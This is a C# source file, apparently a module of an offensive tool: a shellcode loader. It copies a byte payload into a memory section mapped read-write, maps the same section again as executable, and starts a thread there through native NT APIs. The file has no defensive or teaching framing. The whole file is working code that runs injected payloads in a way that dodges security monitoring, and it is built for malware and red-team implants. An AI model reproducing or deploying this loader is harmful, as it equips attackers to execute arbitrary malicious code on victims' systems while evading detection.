using System;
using System.Runtime.InteropServices;

static class NtSection
{
    internal static bool Run(byte[] sc)
    {
        long secSize = sc.Length;
        int status = NtApi.NtCreateSection(
            out IntPtr hSection, NtApi.SectionAllAccess, IntPtr.Zero,
            ref secSize, NtApi.PageExecuteReadWrite,
            NtApi.SecCommit, IntPtr.Zero);
        if (!NtApi.NtSuccess(status))
            return false;

        IntPtr rwBase = IntPtr.Zero;
        IntPtr viewSize = IntPtr.Zero;
        status = NtApi.NtMapViewOfSection(
            hSection, NtApi.CurrentProcess, ref rwBase,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize,
            1, 0, NtApi.PageReadWrite);
        if (!NtApi.NtSuccess(status))
        {
            NtApi.CloseHandle(hSection);
            return false;
        }

        Marshal.Copy(sc, 0, rwBase, sc.Length);

        IntPtr rxBase = IntPtr.Zero;
        viewSize = IntPtr.Zero;
        status = NtApi.NtMapViewOfSection(
            hSection, NtApi.CurrentProcess, ref rxBase,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize,
            1, 0, NtApi.PageExecuteRead);
        if (!NtApi.NtSuccess(status))
        {
            NtApi.CloseHandle(hSection);
            return false;
        }

        status = NtApi.NtCreateThreadEx(
            out IntPtr thread, NtApi.ThreadAllAccess, IntPtr.Zero,
            NtApi.CurrentProcess, rxBase, IntPtr.Zero,
            0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (!NtApi.NtSuccess(status))
        {
            NtApi.CloseHandle(hSection);
            return false;
        }

        NtApi.NtWaitForSingleObject(thread, 0, IntPtr.Zero);
        NtApi.CloseHandle(thread);
        NtApi.CloseHandle(hSection);
        return true;
    }
}
